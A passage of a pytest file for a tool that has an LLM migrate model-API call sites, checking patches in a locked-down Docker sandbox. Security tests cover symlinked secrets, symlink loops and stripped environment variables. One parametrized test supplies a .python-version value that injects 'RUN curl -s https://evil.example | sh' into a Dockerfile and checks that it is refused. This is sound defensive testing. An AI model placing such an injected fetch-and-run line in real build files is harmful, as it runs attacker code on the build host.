    secret.write_text("NEBIUS_API_KEY=canary-secret-123")
    (src / "tinyapp" / "data.txt").symlink_to(secret)
    (src / "tinyapp" / "alias.py").symlink_to("greet.py")  # stays inside the repo: kept, as a link
    boxes = []

    def factory(repo):
        boxes.append(FakeSandbox(repo))
        return boxes[-1]

    llm = patcher_llm(migrate("tinyapp/greet.py"), migrate("tinyapp/shout.py"))
    result = compose_patches(src, tiny_sites(), tiny_verdicts(), tiny_adapters(), llm, src.parent / "work",
                             config=CONFIG, sandbox_factory=factory, build_request=BUILD)  # fmt: skip

    copy = boxes[0].repo
    assert not (copy / "tinyapp" / "data.txt").exists() and not (copy / "tinyapp" / "data.txt").is_symlink()
    assert (copy / "tinyapp" / "alias.py").is_symlink()
    assert not any(
        "canary-secret-123" in f.read_text(errors="ignore") for f in copy.rglob("*") if f.is_file()
    )
    assert result.warnings == ["dropped symlink tinyapp/data.txt: it points outside the repository"]


def test_docker_runs_without_secrets_and_with_resource_limits(monkeypatch, tmp_path):
    seen = []

    def fake_run(cmd, **kw):
        seen.append((cmd, kw))
        return subprocess.CompletedProcess(cmd, 0, stdout="", stderr="")

    monkeypatch.setattr(sandbox_module.subprocess, "run", fake_run)
    monkeypatch.setenv("NEBIUS_API_KEY", "canary-secret-123")

    Sandbox(tmp_path, docker=True).check()

    runs = [cmd for cmd, _ in seen if cmd[:2] == ["docker", "run"]]
    assert runs and all("canary-secret-123" not in " ".join(c) for c in runs)
    for cmd in runs:
        for flag in (["--network", "none"], ["--cpus", "2"], ["--memory", "2g"], ["--pids-limit", "256"],
                     ["--cap-drop", "ALL"], ["--security-opt", "no-new-privileges"]):  # fmt: skip
            assert any(cmd[i : i + 2] == flag for i in range(len(cmd))), flag
        assert "-e" not in cmd and "--env-file" not in cmd and f"{tmp_path.resolve()}:/repo:ro" in cmd
    assert all("canary-secret-123" not in str((kw.get("env") or {}).values()) for _, kw in seen)


@pytest.mark.parametrize(
    ("version", "base"),
    [("3.11", "python3.11"), ("3.12.4", "python3.12"), (None, "python3.12"),
     ("3.12\nRUN curl -s https://evil.example | sh", None), ("pypy3.10", None), ("3.12 # x", None)],
)  # fmt: skip
def test_the_python_version_reaches_the_image_only_when_it_is_a_version(monkeypatch, tmp_path, version, base):
    """.python-version is target-repo text interpolated into the sandbox Dockerfile's FROM line."""
    if version is not None:
        (tmp_path / ".python-version").write_text(version + "\n")
    built = []

    def fake_run(cmd, **kw):
        if cmd[:2] == ["docker", "build"]:
            built.append(Path(cmd[-1], "Dockerfile").read_text())
        return subprocess.CompletedProcess(cmd, 1 if cmd[:3] == ["docker", "image", "inspect"] else 0, "", "")

    monkeypatch.setattr(sandbox_module.subprocess, "run", fake_run)

    result = Sandbox(tmp_path, docker=True).check()

    if base is None:  # refused before any build
        assert built == [] and not result.ok and ".python-version" in result.output
    else:
        assert built and built[0].startswith(f"FROM ghcr.io/astral-sh/uv:{base}-bookworm-slim AS deps\n")


@pytest.mark.parametrize("name", ["requirements.txt", ".python-version"])
def test_a_symlinked_dependency_file_never_reaches_the_image_or_a_message(monkeypatch, tmp_path, name):
    """The sandbox also builds from the original clone (schema imports, oracles), where no link was dropped:
    in the clone layout runs/<id>/repo, requirements.txt -> ../../../.env would carry a host file into the
    image, and a linked .python-version would echo it in the error."""
    repo = tmp_path / "runs" / "r1" / "repo"
    repo.mkdir(parents=True)
    (tmp_path / "outside.env").write_text("canary-outside-the-repo\n")
    (repo / name).symlink_to(Path("../../../outside.env"))
    built = []

    def fake_run(cmd, **kw):
        if cmd[:2] == ["docker", "build"]:
            built.append({f.name: f.read_text() for f in Path(cmd[-1]).iterdir()})
        return subprocess.CompletedProcess(cmd, 1 if cmd[:3] == ["docker", "image", "inspect"] else 0, "", "")

    monkeypatch.setattr(sandbox_module.subprocess, "run", fake_run)
    box = Sandbox(repo, docker=True)

    result, (code, out, err) = box.check(), box.python("print(1)")

    assert built == []  # no build context, so no image, holds it
    assert not result.ok and code != 0 and f"{name} is a symlink" in result.output + err
    assert "canary" not in result.output + out + err


def test_without_docker_or_the_local_opt_in_nothing_runs(monkeypatch):
    monkeypatch.delenv("OFFRAMP_ALLOW_LOCAL_SANDBOX", raising=False)
    llm = FakeLLM()  # no reply queued: the patcher must not be asked

    result = compose_patches(TINY, tiny_sites(), tiny_verdicts(), tiny_adapters(), llm, work_dir("nobox"),
                             config=CONFIG, sandbox_factory=lambda repo: Sandbox(repo, docker=False),
                             build_request=BUILD)  # fmt: skip

    assert result.sandbox_mode == "none"
    assert {verdict(result, s).reason for s in ("cs_01", "cs_03")} == {"no sandbox (Docker unavailable)"}
    assert result.files == {}


def test_a_block_without_its_own_file_line_belongs_to_the_previous_file():
    text = (
        "FILE: a.py\n<<<<<<< SEARCH\nx = 1\n=======\nx = 2\n>>>>>>> REPLACE\n"
        "<<<<<<< SEARCH\ny = 1\n=======\ny = 2\n>>>>>>> REPLACE\n"
        "FILE: b.py\n<<<<<<< SEARCH\nz = 1\n=======\nz = 2\n>>>>>>> REPLACE\nNOTES: n"
    )

    assert [(e.path, e.search) for e in parse_edits(text).edits] == [("a.py", "x = 1"), ("a.py", "y = 1"),
                                                                      ("b.py", "z = 1")]  # fmt: skip


def test_a_block_labelled_with_the_wrong_file_applies_where_its_text_is_unique():
    text = '== "Hi Ana!"\n'  # only in the test file; the reply labels it with the module
    wrong = Edit(path="tinyapp/greet.py", search=text, replace='== "Hi Ana!"  # relabelled\n')
    llm = patcher_llm(PatchEdits(edits=[wrong]), migrate("tinyapp/shout.py"))

    result = run(llm)

    assert verdict(result, "cs_01").decision == "MIGRATE"
    assert "# relabelled" in result.files[TESTS]


def test_failure_summaries_are_stable_across_runs():
    """Repair feedback goes into the next request: run-specific text would make every replay a cache miss."""
    tail = "\nFAILED t.py::x - boom\n1 failed in {}"
    run_a = "E   assert isinstance(<ast.Constant object at 0x7f095ee535d0>, x)" + tail.format("5.58s")
    run_b = "E   assert isinstance(<ast.Constant object at 0x7f3851520a10>, x)" + tail.format("0.91s")

    assert _summary(run_a) == _summary(run_b)
    assert "FAILED t.py::x - boom" in _summary(run_a)
    cases = "".join(f"FAILED t.py::y[{i}] - boom {i}\n" for i in range(3))
    assert _summary(cases) == "FAILED t.py::y[…] (3 cases)"  # a parametrised test counts once


def test_a_symlink_loop_is_dropped_not_fatal():
    """Python 3.12's Path.resolve() raises on a loop; a hostile repo must not abort the run."""
    src = work_dir("loop") / "src"
    shutil.copytree(TINY, src)
    (src / "tinyapp" / "a").symlink_to("b")
    (src / "tinyapp" / "b").symlink_to("a")
    (src / "tinyapp" / "self").symlink_to("self")
    (src / "tinyapp" / "0x").symlink_to("missing/../a")  # dangling prefix, then the a/b loop (3.12 re-review)

    warnings = copy_repo(src, src.parent / "copy")

    copy = src.parent / "copy" / "tinyapp"
    assert not (copy / "self").is_symlink() and not (copy / "a").is_symlink()
    assert "dropped symlink tinyapp/self: it is a symlink loop" in warnings


def test_a_repo_root_package_holding_the_sites_has_no_place_for_the_client():
    repo = work_dir("rootpkg") / "src"
    shutil.copytree(TINY, repo)
    (repo / "__init__.py").write_text("")
    (repo / "greet.py").write_text((repo / "tinyapp" / "greet.py").read_text())
    site = tiny_sites()[0].model_copy(update={"file": "greet.py"})

    work = repo.parent / "w"
    result = compose_patches(repo, [site], [tiny_verdicts()[0]], tiny_adapters(), FakeLLM(), work,
                             config=CONFIG, sandbox_factory=FakeSandbox, build_request=BUILD)  # fmt: skip

    (v,) = result.verdicts
    assert v.decision == "MANUAL_REVIEW" and "repository root, which is itself a Python package" in v.reason
    assert result.files == {}


# ---------------------------------------------------------------- Task 10b: long strings, repair, composition


LONG = "Reply with the final refund amount in the customer's currency alone on the last line as ANSWER."


@pytest.mark.parametrize(
    "line",
    [
        f'    content = "{LONG} {LONG}"\n',
        f'    content = f"Plan: {{plan}}, {{days}} days\\n\\n{LONG} {{{{literal braces}}}} {LONG}"\n',
        f'    content = f"{{d["key"]}} and {{x!r:>{{w}}}} {LONG} {LONG}"\n',
        f'    """{LONG} {LONG}"""\n',
    ],
    ids=["plain", "f-string", "f-string-nested-quotes", "triple-quoted"],
)
def test_long_strings_on_patched_lines_are_wrapped_without_changing_their_values(line):
    source = f"def f(plan, days, d, x, w):\n{line}    return content\n"

    wrapped = wrap_long_strings(source, {2}, 88)

    assert ast.dump(ast.parse(wrapped)) == ast.dump(ast.parse(source))
    assert max(map(len, wrapped.splitlines())) <= 88
    assert "noqa" not in wrapped
    for piece in wrapped.splitlines():  # a piece with no field is a plain string: no ruff F541
        assert not piece.strip().startswith(("f'", 'f"')) or "{" in piece


def test_only_lines_the_patch_touched_are_wrapped():
    source = f'a = "{LONG} {LONG}"\nb = "{LONG} {LONG}"\n'

    wrapped = wrap_long_strings(source, {2}, 88)

    assert wrapped.splitlines()[0] == source.splitlines()[0]
    assert ast.dump(ast.parse(wrapped)) == ast.dump(ast.parse(source))


@pytest.mark.parametrize(
    "source",
    [f'x = b"{LONG} {LONG}"\n', f'x = "{LONG}" "{LONG}"\n', f'x = f"""{{a}} {LONG} {LONG}"""\n'],
    ids=["bytes", "implicit-concatenation", "triple-quoted-f-string"],
)
def test_strings_that_cannot_be_split_safely_are_left_alone(source):
    assert wrap_long_strings(source, {1}, 88) == source


@pytest.mark.parametrize(
    ("files", "expected"),
    [
        ({"pyproject.toml": "[tool.ruff]\nline-length = 100\n"}, 100),
        ({"ruff.toml": "line-length = 79\n", "pyproject.toml": "[tool.ruff]\nline-length = 100\n"}, 79),
        ({".ruff.toml": "line-length = 120\n"}, 120),
        ({"pyproject.toml": "[project]\nname = 'x'\n"}, 88),
        ({}, 88),
    ],
    ids=["pyproject", "ruff.toml-wins", "dot-ruff.toml", "no-ruff-section", "nothing"],
)
def test_line_length_comes_from_the_targets_ruff_config(files, expected):
    repo = work_dir("ruffcfg")
    repo.mkdir(parents=True)
    for name, text in files.items():
        (repo / name).write_text(text)

    assert line_length(repo) == expected


BASE = 'import os\nCHAT = {\n    "qa": "gpt-4o",\n    "refund": "o3",\n    "sum": "haiku",\n}\n'


def test_patches_on_adjacent_lines_of_one_file_compose():
    ours = BASE.replace("import os\n", "import os\nfrom pkg.client import tf\n").replace('"gpt-4o"', '"nemo"')
    theirs = BASE.replace("import os\n", "import os\nfrom pkg.client import tf\n").replace('"o3"', '"nemo"')

    merged = merge_onto(BASE, ours, theirs)

    assert merged == ours.replace('"o3"', '"nemo"')  # both rows changed, the shared import once
    assert merge_onto(BASE, merged, theirs) == merged  # already applied: nothing to do


def test_patches_changing_the_same_line_differently_conflict():
    assert merge_onto(BASE, BASE.replace('"o3"', '"a"'), BASE.replace('"o3"', '"b"')) is None


def test_a_repair_that_repeats_the_failed_patch_stops_without_another_check():
    breaking = migrate("tinyapp/greet.py", extra=[BREAK_GREET])
    llm = patcher_llm(breaking, breaking, migrate("tinyapp/shout.py"))
    boxes = []

    result = run(llm, results=[True, True, False, True, True], sandboxes=boxes)

    assert verdict(result, "cs_01").reason.startswith(
        "repair produced no change; last failure: repo checks failed"
    )
    assert verdict(result, "cs_01").patch_failure == PatchFailure(
        kind="no_change", last="checks_failed", tries=2, model_edit=True
    )
    assert len(boxes[0].checks) == 6  # untouched, base, greet alone + one try, shout alone + its try
    repair = llm.calls[1]
    assert repair["max_tokens"] > llm.calls[0]["max_tokens"] and repair["reasoning"] == "off"
    assert "edit blocks only" in repair["messages"][-1]["content"]


def test_each_site_is_patched_alone_then_all_together():
    mark = Edit(path="tests/test_tinyapp.py", search="from types import SimpleNamespace",
                replace="from types import SimpleNamespace  # both sites")  # fmt: skip
    llm = patcher_llm(migrate("tinyapp/greet.py", extra=[mark]), migrate("tinyapp/shout.py", extra=[mark]))
    boxes = []

    result = run(llm, sandboxes=boxes)

    combined = boxes[0].checks[-1]
    assert MIGRATED in combined["tinyapp/greet.py"] and MIGRATED in combined["tinyapp/shout.py"]
    assert combined["tests/test_tinyapp.py"].count("# both sites") == 1
    assert MIGRATED not in boxes[0].checks[5]["tinyapp/greet.py"]  # shout was checked alone
    assert result.alone == {"cs_01": True, "cs_03": True} and result.combined == ["cs_01", "cs_03"]
    assert result.files["tests/test_tinyapp.py"].count("# both sites") == 1


def test_sites_green_alone_but_red_together_get_one_combined_repair_on_ultra():
    fix = PatchEdits(
        edits=[Edit(path=TESTS, search="from types import", replace="# together\nfrom types import")]
    )
    llm = patcher_llm(migrate("tinyapp/greet.py"), migrate("tinyapp/shout.py"), fix)

    # untouched, base, greet alone, shout alone, all together (red), after the combined repair (green)
    result = run(llm, results=[True, True, True, True, False, True])

    assert result.combined == ["cs_01", "cs_03"] and result.combined_repair == [TESTS]
    assert result.files[TESTS].startswith("# together\n") and result.combined_failure is None
    repair = llm.calls[2]
    assert (repair["tier"], repair["reasoning"], repair["messages"][0]["content"]) == (
        Tier.ULTRA,
        "off",
        TOGETHER,
    )
    prompt = repair["messages"][-1]["content"]
    assert "- cs_01 `tinyapp/greet.py` `greet`" in prompt and "With all of them merged, this repo's" in prompt
    assert "### tinyapp/greet.py (read-only)" in prompt and f"### {TESTS} (editable)" in prompt


def test_a_site_green_alone_but_not_together_is_dropped_from_the_combined_tree():
    module = PatchEdits(edits=[Edit(path="tinyapp/shout.py", search=".upper()", replace="")])
    llm = patcher_llm(
        migrate("tinyapp/greet.py"),
        migrate("tinyapp/shout.py"),
        module,
        *[
            PatchEdits(
                edits=[Edit(path=TESTS, search="from types import", replace=f"# try {i}\nfrom types import")]
            )
            for i in (1, 2)
        ],
    )

    # untouched, base, greet alone, shout alone, together (red), repair 2 (red: repair 1 edits a module),
    # then one at a time: greet (green), greet + shout (red)
    result = run(llm, results=[True, True, True, True, False, False, True, False])

    assert [c["tier"] for c in llm.calls[2:]] == [Tier.ULTRA, Tier.ULTRA]  # two combined repairs at most
    assert f"tinyapp/shout.py {LOCKED}" in llm.calls[3]["messages"][-1]["content"]
    assert result.alone == {"cs_01": True, "cs_03": True} and result.combined == ["cs_01"]
    assert result.combined_failure.startswith("repo checks failed on the merged patches")
    shout = verdict(result, "cs_03")
    assert shout.decision == "MANUAL_REVIEW" and "green alone, but not together with cs_01" in shout.reason
    assert shout.patch_failure == PatchFailure(kind="not_together")
    assert "tinyapp/shout.py" not in result.files and verdict(result, "cs_01").decision == "MIGRATE"
    assert "# try" not in result.files[TESTS]  # the failed repair is not in the tree


def test_a_long_piece_of_a_multi_line_concatenation_is_split_in_place():
    """cs_05's recorded patch: the suffix became one more 208-column piece of an existing concatenation."""
    source = (
        "def f(request):\n"
        "    return [\n"
        "        {\n"
        '            "content": (\n'
        '                f"Plan: {request.plan_name}\\n"\n'
        f'                f"How much do we refund, in {{request.currency}}?\\n\\n{LONG} {LONG}"\n'
        "            ),\n"
        "        }\n"
        "    ]\n"
    )

    wrapped = wrap_long_strings(source, {6}, 100)

    assert ast.dump(ast.parse(wrapped)) == ast.dump(ast.parse(source))
    assert max(map(len, wrapped.splitlines())) <= 100 and "((" not in wrapped


def test_a_test_using_a_pytest_fixture_it_never_requested_gets_it_as_a_parameter():
    source = (
        "import pytest\n\n\n"
        "def test_a():\n    monkeypatch.setattr('x.y', 1)\n\n\n"
        "@pytest.mark.parametrize('n', [1])\n"
        "def test_b(n, capsys):\n    monkeypatch.setenv('A', '1')\n    capsys\n\n\n"
        "def test_c(monkeypatch):\n    monkeypatch.setenv('A', '1')\n\n\n"
        "def helper():\n    monkeypatch = 1\n    return monkeypatch\n\n\n"
        "def tmp_path(**kw):\n    return kw\n\n\n"
        "def test_d():\n    assert tmp_path(a=1)\n"
    )

    fixed = add_fixtures(source)

    assert "def test_a(monkeypatch):" in fixed and "def test_b(n, capsys, monkeypatch):" in fixed
    assert "def test_c(monkeypatch):" in fixed and "def helper():" in fixed
    assert "def test_d():" in fixed  # tmp_path is the module's own helper here, not the fixture
    assert add_fixtures(fixed) == fixed


def test_fixture_parameters_land_in_the_signature_even_with_a_comment_or_in_a_class():
    source = (
        "class TestX:\n"
        "    def test_m(self):  # covers (a) and (b): done\n"
        "        with open('f'):\n"
        "            monkeypatch.chdir('.')\n"
    )

    fixed = add_fixtures(source)

    assert "    def test_m(self, monkeypatch):  # covers (a) and (b): done\n" in fixed
    assert "        with open('f'):\n" in fixed


def test_a_test_body_on_the_signature_line_does_not_crash_the_run():
    """A model reply put the body on the `):` line: locating the signature must not raise (TokenError)."""
    source = "def test_x(\n    a,\n): monkeypatch.setattr('x', 1)\n"
    assert add_fixtures(source) == source

    odd_test = "def test_motto_returns_the_reply(\n): monkeypatch.setenv('A', '1')\n\n\ndef _unused():\n"
    odd = Edit(path="tests/test_tinyapp.py", search="def test_motto_returns_the_reply():\n", replace=odd_test)
    llm = patcher_llm(migrate("tinyapp/greet.py", extra=[odd]), migrate("tinyapp/shout.py"))

    result = run(llm)

    assert (
        verdict(result, "cs_01").decision == "MIGRATE"
    )  # decided, not crashed (the fake sandbox says green)


def test_two_repair_rounds_each_see_the_last_failure():
    first = migrate("tinyapp/greet.py", extra=[BREAK_GREET])
    second = PatchEdits(edits=[REBREAK_GREET])
    third_reply = PatchEdits(edits=[Edit(path=TESTS, search='"hi ana!"', replace='"Hi Ana!"')])
    llm = patcher_llm(first, second, third_reply, migrate("tinyapp/shout.py"))

    result = run(llm, results=[True, True, False, False, True, True, True])

    assert verdict(result, "cs_01").decision == "MIGRATE" and result.alone["cs_01"]
    third = llm.calls[2]
    assert third["max_tokens"] == 12000 and len(third["messages"]) == 6
    assert third["messages"][-2]["content"] == edits_text(second)


def test_a_repair_that_returns_to_an_earlier_patch_stops_too():
    a = migrate("tinyapp/greet.py", extra=[BREAK_GREET])
    b = PatchEdits(edits=[REBREAK_GREET])
    back = PatchEdits(edits=[Edit(path=TESTS, search='"hi ana!"', replace='"Hi Ana"')])  # a's tree again
    boxes = []

    result = run(patcher_llm(a, b, back, migrate(SHOUT)), results=[True, True, False, False, True],
                 sandboxes=boxes)  # fmt: skip

    greet = verdict(result, "cs_01")  # the undo of b is a's tree: a's own failure, not "no change"
    assert greet.reason.startswith("the repair returned to a patch already checked; its failure: repo checks")
    assert (greet.patch_failure.kind, greet.patch_failure.model_edit) == ("checks_failed", True)
    assert len(boxes[0].checks) == 7  # untouched, base, greet alone, a, b, shout alone, shout: a once


@pytest.mark.parametrize(
    "module_binding",
    [
        "tmp_path: str = 'x'\n",
        "try:\n    tmp_path = 1\nexcept ImportError:\n    pass\n",
        "from helpers import *\n",
    ],
    ids=["annotated", "inside-try", "star-import"],
)
def test_a_module_name_that_might_be_the_fixture_is_never_shadowed(module_binding):
    source = f"{module_binding}\n\ndef test_x():\n    assert tmp_path\n"

    assert add_fixtures(source) == source


def test_repairs_run_on_ultra_with_thinking_off():
    breaking = migrate("tinyapp/greet.py", extra=[BREAK_GREET])
    llm = patcher_llm(breaking, migrate("tinyapp/greet.py"), migrate("tinyapp/shout.py"))

    run(llm, results=[True, True, False, True, True])

    assert [(c["tier"], c["reasoning"]) for c in llm.calls] == [
        (Tier.SUPER, "off"), (Tier.ULTRA, "off"), (Tier.SUPER, "off")]  # fmt: skip


OPENAI_SITE = """def triage(client, subject):
    response = client.chat.completions.create(
        model="gpt-4o-mini",
        temperature=0,
        max_tokens=16,
        messages=[
            {"role": "system", "content": PROMPT},
            {"role": "user", "content": f"Subject: {subject}"},
        ],
    )
    return response.choices[0].message.content
"""
ANTHROPIC_SITE = """def step(client, text):
    response = client.messages.create(
        model="claude-sonnet-4-5",
        max_tokens=512,
        system=PROMPT,
        tools=TOOLS,
        tool_choice={"type": "any"},
        messages=[{"role": "user", "content": (f"Customer: {text}\\n" "Choose.")}],
    )
    return response.content
"""
REQUEST = {
    "model": LIGHTNING,
    "max_tokens": 16,
    "temperature": 0.0,
    "tools": [{"type": "function", "function": {"name": "f", "parameters": {"type": "object"}}}],
    "tool_choice": "required",
    "extra_body": THINK_OFF,
}


def _site(function, sdk="openai"):
    return CallSite(id="cs_09", file="m.py", lines=[2, 10], sdk=sdk, call="c", function=function,
                    prompt_source="fstring")  # fmt: skip


@pytest.mark.parametrize(("source", "function"), [(OPENAI_SITE, "triage"), (ANTHROPIC_SITE, "step")])
def test_the_call_is_rewritten_by_code_to_the_evaluated_request(source, function):
    constants = {"few_shot": "NEMOTRON_FEW_SHOT", "suffix": "NEMOTRON_USER_SUFFIX", "tools": "NEMOTRON_TOOLS"}

    out = _rewrite_call(source, _site(function), constants, "PROMPT", REQUEST, 100)

    call = next(n for n in ast.walk(ast.parse(out)) if isinstance(n, ast.Call) and n.keywords)
    assert ast.unparse(call.func).endswith("chat.completions.create") and "messages.create" not in out
    kwargs = {k.arg: k.value for k in call.keywords}
    assert list(kwargs) == [*REQUEST, "messages"]  # written out, in order; nothing else passed
    assert ast.unparse(kwargs["tools"]) == "NEMOTRON_TOOLS"  # a schema goes by its constant's name
    assert {k: ast.literal_eval(v) for k, v in kwargs.items() if k not in ("tools", "messages")} == {
        k: v for k, v in REQUEST.items() if k != "tools"
    }
    first, few, user = kwargs["messages"].elts
    assert ast.unparse(first) == "{'role': 'system', 'content': PROMPT}"
    assert ast.unparse(few) == "*NEMOTRON_FEW_SHOT"
    assert ast.unparse(user.values[1]).endswith("+ NEMOTRON_USER_SUFFIX")
    assert "system=" not in out and "gpt-4o-mini" not in out and "claude" not in out


def test_a_call_whose_messages_are_built_elsewhere_is_left_to_the_model():
    source = "def f(client, msgs):\n    return client.chat.completions.create(model='m', messages=msgs)\n"

    assert _rewrite_call(source, _site("f"), {}, None, REQUEST, 100) is None


def _rewritten(edit=None):
    out = _rewrite_call(OPENAI_SITE, _site("triage"), {"tools": "NEMOTRON_TOOLS"}, "PROMPT", REQUEST, 100)
    out = f"PROMPT = 'p'\nNEMOTRON_TOOLS = {REQUEST['tools']!r}\n\n\n{out}"
    return out if edit is None else out.replace(*edit)


@pytest.mark.parametrize(
    ("edit", "problem"),
    [
        (("max_tokens=16,", "max_tokens=64,"), "`max_tokens` must be exactly"),
        (("temperature=0.0,", "temperature=0.7,"), "`temperature` must be exactly"),
        (('"enable_thinking": False', '"enable_thinking": True'), "`extra_body` must be exactly"),
        ((f'model="{LIGHTNING}",', 'model="gpt-4o-mini",'), "`model` must be exactly"),
        (("tool_choice=", "top_p=0.5,\n        tool_choice="), "must pass exactly"),
        (("max_tokens=16,", "**EXTRA,"), "no **"),
        (("'type': 'object'", "'type': 'array'"), "`tools` must be exactly"),
        (('"content": PROMPT', '"content": "Be brief."'), "system prompt constant PROMPT is not used"),
    ],
    ids=["max-tokens", "temperature", "thinking", "model", "extra-kwarg", "splat", "schema", "system-prompt"],
)
def test_a_call_that_strays_from_the_evaluated_request_is_not_conformant(edit, problem):
    assert conformance(_rewritten(), _site("triage"), REQUEST, {"tools": "NEMOTRON_TOOLS"}, "PROMPT") == []

    problems = conformance(_rewritten(edit), _site("triage"), REQUEST, {"tools": "NEMOTRON_TOOLS"}, "PROMPT")

    assert any(problem in p for p in problems), problems


TEXT_SITE = """def summarize(client: Anthropic, thread):
    response = client.chat.completions.create(model="m", messages=[])
    return "".join(block.text for block in response.content if block.type == "text").strip()
"""
FIRST_TEXT_SITE = """def summarize(client, thread):
    response = client.chat.completions.create(model="m", messages=[])
    reply = response.content[0].text
    return reply
"""
TOOL_SITE = """def step(client: Anthropic, text):
    response = client.chat.completions.create(model="m", messages=[])
    for block in response.content:
        if block.type == "tool_use" and block.name in NAMES:
            return Action(tool=block.name, args=dict(block.input), ref=block.id)
    return None
"""


@pytest.mark.parametrize(
    ("source", "function", "expected"),
    [
        (TEXT_SITE, "summarize", 'return (response.choices[0].message.content or "").strip()'),
        (FIRST_TEXT_SITE, "summarize", 'reply = response.choices[0].message.content or ""'),
        (TOOL_SITE, "step", "for block in response.choices[0].message.tool_calls or []:\n"
         '        if block.type == "function" and block.function.name in NAMES:\n'
         "            return Action(tool=block.function.name, "
         "args=dict(json.loads(block.function.arguments)), ref=block.id)"),
    ],
    ids=["joined-text", "first-text", "tool-loop"],
)  # fmt: skip
def test_an_anthropic_reply_is_read_the_openai_way_by_code(source, function, expected):
    out = _map_reply(source, _site(function, sdk="anthropic"))

    assert expected in out and "response.content" not in out
    assert "Anthropic" not in out or "client: OpenAI" in out  # the client's annotation follows
    assert _map_reply(OPENAI_SITE, _site("triage")) == OPENAI_SITE  # an OpenAI site already reads it so


@pytest.mark.parametrize(
    "source",
    [
        ANTHROPIC_SITE.replace(
            "client.messages.create", "client.chat.completions.create"
        ),  # returns it whole
        TOOL_SITE.replace("block.id", "block.text"),  # a text block read inside the tool loop
        TEXT_SITE.replace(".strip()", " + str(response.usage.input_tokens)"),
    ],
    ids=["whole-reply", "mixed-loop", "usage"],
)
def test_a_reply_used_any_other_way_is_left_to_the_model(source):
    function = "step" if "def step" in source else "summarize"

    assert _map_reply(source, _site(function, sdk="anthropic")) is None


FAKES = """import inspect
from types import SimpleNamespace

from anthropic.resources.messages import Messages
from openai.resources.chat.completions import Completions


def _check_kwargs(method, kwargs):
    assert set(kwargs) <= set(inspect.signature(method).parameters)


class FakeAnthropic:
    \"\"\"Replies with the given content blocks.\"\"\"

    def __init__(self, *blocks):
        self.blocks = list(blocks)
        self.calls = []
        self.messages = SimpleNamespace(create=self._messages)

    def _messages(self, **kwargs):
        _check_kwargs(Messages.create, kwargs)
        self.calls.append(kwargs)
        return Message(id="msg_fake", content=self.blocks, stop_reason="end_turn")
"""


def test_an_anthropic_fake_also_answers_the_openai_call_with_the_same_blocks():
    out = convert_fakes(FAKES, "helphub.offramp_client")

    ast.parse(out)
    assert "    def _chat_completion(self, **kwargs):\n" in out
    assert "        _check_kwargs(Completions.create, kwargs)\n        self.calls.append(kwargs)\n" in out
    assert "        return chat_completion_from_blocks(self.blocks)\n" in out
    assert "self.chat = SimpleNamespace(" in out and "create=self._chat_completion" in out
    assert out.index("def chat_completion_from_blocks") < out.index("class FakeAnthropic")
    assert "import json" in out and "from openai.types.chat import ChatCompletion" in out
    assert convert_fakes(out, "helphub.offramp_client") == out  # once only


def test_the_fake_helper_turns_blocks_into_a_real_chat_completion():
    space: dict = {"json": json, "ChatCompletion": ChatCompletion}
    exec(FAKE_HELPER, space)  # noqa: S102 - our own constant
    text = SimpleNamespace(type="text", text="Hello")
    tool = SimpleNamespace(type="tool_use", id="toolu_1", name="lookup_order", input={"order_id": "HH-1"})

    message = space["chat_completion_from_blocks"]([text, tool]).choices[0].message
    empty = space["chat_completion_from_blocks"]([]).choices[0].message

    assert message.content == "Hello" and message.tool_calls[0].function.name == "lookup_order"
    assert json.loads(message.tool_calls[0].function.arguments) == {"order_id": "HH-1"}
    assert empty.content is None and empty.tool_calls is None


@pytest.mark.parametrize(
    "literal", ['"a string that fits on its own line"', 'f"Subject: {s}, thirty-odd characters"']
)
def test_a_literal_that_fits_alone_moves_to_its_own_line(literal):
    """cs_01's live patch: a test assert ran to 101 columns although its string itself was short."""
    check = f"call['messages'][1]['content'] == {literal} and call['n'] == 123456"
    source = f"def test_x(s, call):\n    assert {check}\n"

    wrapped = wrap_long_strings(source, {2}, 88)

    assert ast.dump(ast.parse(wrapped)) == ast.dump(ast.parse(source))
    assert max(map(len, wrapped.splitlines())) <= 88


CALLER = """from openai import OpenAI

from helphub.inbox.triage import triage_ticket

COMMANDS = {
    "triage": lambda c: triage_ticket(OpenAI(), c["subject"], c["body"]),
    "search": lambda c: search_kb(OpenAI(), c["q"]),
}
"""


def test_callers_pass_the_token_factory_client_to_the_migrated_function_only():
    site, client = "helphub/inbox/triage.py", "helphub.offramp_client"
    out = rewrite_callers({"helphub/cli.py": CALLER}, site, "triage_ticket", client)["helphub/cli.py"]

    assert 'triage_ticket(token_factory_client(), c["subject"], c["body"])' in out
    assert 'search_kb(OpenAI(), c["q"])' in out  # other functions keep their client
    assert "from helphub.offramp_client import token_factory_client" in out
    assert rewrite_callers({"helphub/cli.py": out}, site, "triage_ticket", client) == {}


def test_tests_that_fake_the_openai_constructor_fake_the_token_factory_client_too():
    source = (
        "def test_runs(monkeypatch, capsys):\n"
        '    monkeypatch.setattr(cli, "OpenAI", lambda: FakeOpenAI(reply))\n'
        '    monkeypatch.setattr(cli, "Anthropic", lambda: FakeAnthropic())\n'
        '    monkeypatch.setattr(other, "OpenAI", lambda: FakeOpenAI(reply))\n'
    )

    out = mirror_fakes(source, {"cli"})

    assert (
        out.splitlines()[2]
        == '    monkeypatch.setattr(cli, "token_factory_client", lambda: FakeOpenAI(reply))'
    )
    assert 'other, "token_factory_client"' not in out  # not a module whose code was changed
    assert mirror_fakes(out, {"cli"}) == out
    anthropic = mirror_fakes(source, {"cli"}, "Anthropic")  # an Anthropic site: its (converted) fake
    assert anthropic.splitlines()[3] == (
        '    monkeypatch.setattr(cli, "token_factory_client", lambda: FakeAnthropic())'
    )


BUILT_GREET = """GREET_SYSTEM_PROMPT = "You write one-line greetings."


def greet(client, name: str) -> str:
    messages = [
        {"role": "system", "content": GREET_SYSTEM_PROMPT},
        {"role": "user", "content": f"Greet {name}."},
    ]
    response = client.chat.completions.create(model="gpt-4o-mini", max_tokens=32, messages=messages)
    return (response.choices[0].message.content or "").strip()
"""


def write_case(repo: Path, sid: str, variables: dict, system: str, user: str) -> None:
    """One eval case in the repo's evals/, as `offramp prepare` writes them: the probe drives the function."""
    messages = [{"role": "system", "content": system}, {"role": "user", "content": user}]
    case = EvalCase(id=f"{sid}:001", site_id=sid, variables=variables, input_messages=messages,
                    expected_kind="text", split="dev")  # fmt: skip
    (repo / "evals" / "cases").mkdir(parents=True, exist_ok=True)
    (repo / "evals" / "cases" / f"{sid}.jsonl").write_text(case.model_dump_json() + "\n")


def tiny_built() -> tuple[Path, Edit]:
    """The tiny repo with greet's messages built before the call (the code cannot rewrite that call), and
    the edit a model would write for it."""
